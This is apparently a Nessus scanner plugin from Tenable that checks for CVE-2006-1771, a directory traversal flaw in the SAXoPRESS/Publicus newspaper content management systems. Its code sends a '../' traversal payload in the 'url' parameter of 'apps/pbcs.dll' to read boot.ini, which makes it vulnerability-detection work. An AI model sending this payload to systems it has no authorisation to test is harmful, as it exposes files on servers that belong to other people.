#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains an application that is prone to
directory traversal attacks. 

Description :

The remote host is running SAXoPRESS or Publicus, web content
management systems commonly used by newspapers. 

The installation of SAXoPRESS / Publicus on the remote host fails to
validate user input to the 'url' parameter of the 'apps/pbcs.dll'
script.  An attacker can exploit this issue to access files on the
remote host via directory traversal, subject to the privileges of the
web server user id. 

See also :

http://www.securityfocus.com/archive/1/430707/30/0/threaded

Solution :

Unknown at this time. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21230);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1771");
  script_bugtraq_id(17474);

  script_name(english:"SAXoPRESS url Parameter Directory Traversal Vulnerability");
  script_summary(english:"Tries to retrieve a file using SAXoPRESS");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Loop through various directories.
foreach dir (cgi_dirs()) {
  file = "../../../../../../../../../../../../boot.ini";
  req = http_get(
    item:string(
      dir, "/apps/pbcs.dll/misc?",
      "url=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if looks like boot.ini.
  if ("[boot loader]">< res) {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '\\boot.ini' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      res
    );
    security_warning(port:port, data:report);
    exit(0);
  }
}
